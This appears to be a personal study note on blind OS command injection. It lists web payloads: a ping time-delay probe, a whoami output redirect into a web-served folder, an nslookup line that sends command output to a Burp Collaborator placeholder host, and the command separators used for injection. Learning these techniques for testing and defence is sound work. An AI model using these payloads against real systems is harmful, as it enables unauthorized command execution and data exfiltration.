# Blind OS command injection
Many instances of OS command injection are blind vulnerabilites. We can use similar methods to [[Blind SQL injection]] to exploit this vulnerabilites.

## Detecting blind OS command injection using time delays
```bash
& ping -c 10 127.0.0.1 &
```
This will causse the application to ping its loopback network adapter for 10 seconds.

## Exploiting blind OS command injection by redirecting output
If the application serves static resources from the filesystem location `/var/www/static`, then you can submit the followwing input
```bash
& whoami > /var/www/static/whoami.txt & 
```

The `>` character send the output from the `whoami` command to the specified file. You can then fetch `https://vulnerable-website.com/whoami.txt` to retrieve the file, and view the output from the injected command.

## Exploitingg blind OS command injection using out-of-band(OAST) techniques
Same concept as [[Blind SQL injection#Out-of-band techniques OAST]]
```shell
& nslookup `command`.[BURP-COLLABORATION-URL]
```

## Ways of injecting OS commands
Command separators:
* `&`
* `&&`
* `|`
* `||`

On Unix-based system you can use backticks or the dollar character `$` to perform inline execution of an injected command within the original command
